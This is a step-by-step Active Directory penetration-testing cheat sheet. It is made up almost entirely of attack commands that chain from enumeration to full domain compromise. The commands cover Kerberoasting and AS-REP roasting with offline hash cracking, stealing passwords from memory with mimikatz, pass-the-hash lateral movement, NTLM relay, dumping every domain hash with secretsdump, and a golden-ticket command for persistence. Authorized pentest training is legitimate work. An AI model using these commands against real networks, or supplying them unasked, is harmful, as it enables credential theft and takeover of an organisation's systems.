# external recon

# Quick Guide To AD Pentesting

**🔥 Step-by-Step AD Pentesting Cheat Sheet**

### **1️⃣ Enumeration (Always Start Here!)**

Your goal: **Find Users, Computers, Groups, and AD Misconfigurations.**

🔹 **Basic Enumeration (No Credentials)** ✅ `nmap -p 88,135,139,389,445,464,593,636,3268,3389 --script=ldap* --script=smb* <target>`

✅ `smbclient -L //target -N` → Check SMB Shares

✅ `crackmapexec smb <target>` → Check SMB, Users, and Shares

✅ `kerbrute userenum -d domain.com --dc <DC-IP> usernames.txt` → Find Valid Users

🔹 **Detailed Enumeration (With Credentials)** ✅ `bloodhound-python -u user -p pass -d domain.com -c All -dc-ip <DC-IP>` → Full AD Mapping

✅ `rpcclient -U 'user%pass' <DC-IP>` → Query AD Info

✅ `net group "Domain Admins" /domain` → Check Domain Admins

✅ `net user /domain` → List All Users

✅ `crackmapexec ldap <DC-IP> -u user -p pass --asreproast` → Check for AS-REP Roastable Accounts

📌 **If You Find Null SMB Shares or Weak Users → Move to Exploitation.**

---

### **2️⃣ Exploitation (Privilege Escalation & Lateral Movement)**

Your goal: **Escalate Privileges from a Low-Level User.**

🔹 **Kerberoasting (If Kerberos Enabled)** ✅ `GetUserSPNs.py -dc-ip <DC-IP> domain/user:pass -request`

✅ `john --wordlist=rockyou.txt hash.txt`

🔹 **AS-REP Roasting (If User Doesn’t Require Pre-Auth)** ✅ `GetNPUsers.py -dc-ip <DC-IP> -usersfile users.txt domain/ -format hashcat`

✅ `hashcat -m 18200 hash.txt rockyou.txt --force`

🔹 **Pass-the-Hash / Pass-the-Ticket (Lateral Movement)** ✅ `mimikatz.exe` → `sekurlsa::logonpasswords` → Steal Passwords

✅ `psexec.py domain/user@target -hashes LM:NT`

🔹 **NTLM Relay Attacks (If SMB Signing is Disabled)** ✅ `ntlmrelayx.py -t smb://target --smb2support`

📌 **If you get a higher-privilege account → Use It for Full Compromise.**

---

### **3️⃣ Full Domain Compromise (Domain Admin Access!)**

Your goal: **Get Domain Admin and Dump All Passwords.**

🔹 **Check if You Are a Domain Admin** ✅ `whoami /groups`

✅ `net group "Domain Admins" /domain`

🔹 **Dump All AD Hashes (If DA Access)** ✅ `secretsdump.py -dc-ip <DC-IP> domain/admin:password@target`

🔹 **Golden Ticket Attack (Persistence)** ✅ `mimikatz.exe` → `kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt`

📌 **Once You Get DA → You Have Fully Compromised the Domain!**

---